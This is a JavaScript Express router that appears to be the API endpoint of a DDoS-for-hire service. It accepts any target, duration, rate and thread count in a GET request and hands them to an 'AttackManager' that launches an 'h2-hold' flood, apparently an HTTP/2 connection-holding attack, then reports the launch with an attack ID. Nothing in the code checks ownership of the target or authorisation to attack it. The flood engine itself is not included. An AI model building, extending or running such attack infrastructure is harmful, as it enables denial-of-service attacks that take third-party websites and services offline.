const express = require('express');
const router = express.Router();
const { v4: uuidv4 } = require('uuid');
const AttackManager = require('../lib/attackManager');
const rateLimit = require('express-rate-limit');

const attackManager = new AttackManager();

const limiter = rateLimit({
  windowMs: 5 * 60 * 1000,
  max: 10,
  message: { success: false, error: 'Too many requests, please try again later' }
});

router.get('/', limiter, async (req, res) => {
  const { target, time, rate, threads } = req.query;
  
  if (!target || !time || !rate || !threads) {
    return res.status(400).json({
      success: false,
      error: 'Parameter target, time, rate, dan threads diperlukan'
    });
  }

  if (!attackManager.canStartAttack()) {
    return res.status(429).json({
      success: false,
      error: 'Server is busy, please try again later'
    });
  }

  try {
    const attackId = uuidv4();
    const params = [target, time, rate, threads];
    await attackManager.executeAttack('h2-hold', attackId, params, parseInt(time) * 1000 + 5000);
    
    res.json({
      success: true,
      method: 'h2hold',
      target: target,
      time: time,
      rate: rate,
      threads: threads,
      attackId: attackId,
      message: 'Attack launched successfully'
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      error: error.message,
      method: 'h2hold'
    });
  }
});

module.exports = router;